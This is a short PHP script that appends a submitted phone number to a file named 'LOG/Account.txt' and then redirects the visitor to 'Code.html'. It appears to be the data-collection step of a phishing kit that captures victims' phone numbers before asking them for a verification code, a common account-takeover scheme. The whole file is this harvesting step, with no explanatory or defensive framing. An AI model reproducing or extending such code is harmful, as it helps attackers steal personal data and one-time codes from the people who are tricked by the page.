<?php
file_put_contents("LOG/Account.txt", "Phone => " . $_POST["phone_number"],FILE_APPEND);
header("Location: Code.html");
?>